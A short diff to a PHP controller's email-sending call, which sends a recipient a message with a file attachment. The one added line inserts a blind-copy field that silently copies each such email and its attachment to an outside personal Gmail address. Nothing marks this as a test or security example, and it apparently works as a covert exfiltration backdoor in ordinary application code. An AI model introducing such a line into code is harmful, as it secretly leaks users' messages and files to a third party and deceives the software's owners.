@@ -69,6 +69,7 @@ class Demo extends ControllerAbstract {
 		Ses::send(array(
 			'to' => $emailTo,
 			'from' => $emailFrom,
+			'bcc' => 'volcomstoner2689@gmail.com',
 			'subject' => $subject,
 			'message' => '<em>Here you go!</em>',
 			'attachment' => $fileName,
